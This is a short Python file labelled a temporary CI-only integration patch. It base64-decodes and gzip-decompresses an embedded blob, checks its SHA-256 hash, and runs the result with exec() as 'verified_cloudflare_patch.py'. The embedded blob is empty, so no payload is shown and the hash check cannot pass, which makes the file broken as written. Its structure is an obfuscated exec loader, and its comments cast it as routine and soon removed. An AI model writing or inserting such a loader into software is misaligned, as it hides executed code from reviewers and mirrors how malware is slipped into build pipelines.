# Temporary CI-only integration patch, SHA-256 checked before execution.
# It is removed from the feature branch after verified builds.
import base64
import gzip
import hashlib
source = gzip.decompress(base64.b64decode(""""""))
assert hashlib.sha256(source).hexdigest() == '8b2e1e2121c368ddbcedd79bd76feb2ab413a157aa530cfe62743ab484ec7261', 'Unexpected patch bytes'
exec(compile(source, 'verified_cloudflare_patch.py', 'exec'))
